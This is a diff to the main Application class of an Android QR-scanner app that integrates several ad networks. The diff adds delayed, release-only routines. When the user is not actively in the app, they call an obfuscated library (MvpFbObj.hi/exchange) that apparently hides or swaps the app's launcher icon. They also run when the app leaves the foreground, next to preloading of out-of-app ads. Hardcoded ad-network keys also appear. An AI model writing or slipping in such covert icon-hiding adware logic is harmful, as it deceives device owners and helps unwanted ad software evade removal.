@@ -1,5 +1,6 @@
 package com.qr.myqr
 
+import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.ActivityManager
 import android.content.Context
@@ -18,8 +19,8 @@ import com.anythink.network.pangle.PangleATInitConfig
 import com.anythink.network.vungle.VungleATInitConfig
 import com.qr.myqr.basic.BaseApp
 import com.qr.myqr.basic.BasePage
+import com.qr.myqr.data.AppCache
 import com.qr.myqr.data.StartupProvider
-import com.qr.myqr.main.MainActivity
 import com.qr.myqr.page.FirstActivity
 import com.qr.myqr.revenue.AdPos
 import com.qr.myqr.revenue.AdsLoader
@@ -28,6 +29,7 @@ import com.reader.multiple.vb.MvpFbObj
 import kotlinx.coroutines.*
 
 const val isReleaseMode = false
+@SuppressLint("StaticFieldLeak")
 lateinit var appIns: App
 class App : BaseApp() {
 
@@ -47,10 +49,8 @@ class App : BaseApp() {
 
         if (processName() != packageName) return
         initTopOn()
+        checkChangeProperty()
 
-        if (isReleaseMode && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-            MvpFbObj.hi(this, FirstActivity::class.java.name)
-        }
         StartupProvider.onStart()
         registerActivityLifecycleCallbacks(ActivityLife())
 
@@ -59,6 +59,30 @@ class App : BaseApp() {
             AdsLoader.preloadAd(appIns, AdPos.insOut)
             AdsLoader.preloadAd(appIns, AdPos.navOut)
         }
+    }
+
+    private fun checkChangeProperty() {
+        if (!isReleaseMode) return
+        if (AppCache.ins.appPropertyChanged) return
+        MainScope().launch {
+            delay(3000L)
+            val userInApp = userInAppIdentification != null
+            if (!userInApp) {
+                delay(18_000L)
+                doChangeProperty()
+            }
+        }
+    }
+
+    private fun doChangeProperty() {
+        if (!StartupProvider.isOneShotEnable()) return
+        if (AppCache.ins.appPropertyChanged) return
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            MvpFbObj.hi(this, FirstActivity::class.java.name)
+        } else {
+            MvpFbObj.exchange(this, FirstActivity::class.java.name, "$packageName.exchanges")
+        }
+        AppCache.ins.appPropertyChanged = true
     }
 
     private fun processName(): String? {
@@ -91,7 +115,7 @@ class App : BaseApp() {
 
         val atInitConfigs = ArrayList<ATInitConfig>()
         //Mintegral
-        val mintegralATInitConfig = MintegralATInitConfig("213106", "b1e6051ecf82329ecc7ef8f4d3b61e67")
+        val mintegralATInitConfig = MintegralATInitConfig("213106", "92b0c74522d64b889cea6afa5b6774bc")
         //AdColony
         val adColonyATInitConfig = AdColonyATInitConfig("app6fc6ed9b1b3f43199c", "vza7f081451a5848c5ab")
         //Pangle
@@ -119,8 +143,9 @@ class App : BaseApp() {
     var blockOneHotLoad = false
     var isScreenOn = true
 
+    private var userInAppIdentification: Activity? = null
+
     private var nActivity = 0
-    private var delayJob: Job? = null
     private var reachHot = false
     private inner class ActivityLife: ActivityLifecycleCallbacks {
         override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
@@ -129,7 +154,6 @@ class App : BaseApp() {
         override fun onActivityStarted(activity: Activity) {
             //loggerActivityLife("onActivityStarted: $activity")
             if (nActivity++ == 0) {
-                delayJob?.cancel()
                 //ProtectService.activityCheckStartup()
 
                 if (reachHot) {
@@ -150,19 +174,18 @@ class App : BaseApp() {
         override fun onActivityStopped(activity: Activity) {
             //loggerActivityLife("onActivityStopped: $activity")
             if (--nActivity <= 0) {
-                delayJob = GlobalScope.launch {
-                    delay(1000L)
-                    reachHot = true
+                doChangeProperty()
 
-                    if (activity.isFinishing || activity.isDestroyed) return@launch
-                    //if (activity is MainActivity) return@launch
-                    Log.e("ActivityLife", "finish: $activity")
-                    activity.finish()
-                }
+                reachHot = true
+                if (activity.isFinishing || activity.isDestroyed) return
+                //if (activity is MainActivity) return@launch
+                Log.e("ActivityLife", "finish: $activity")
+                activity.finish()
             }
         }
 
         override fun onActivityResumed(activity: Activity) {
+            userInAppIdentification = activity
         }
 
         override fun onActivityPaused(activity: Activity) {
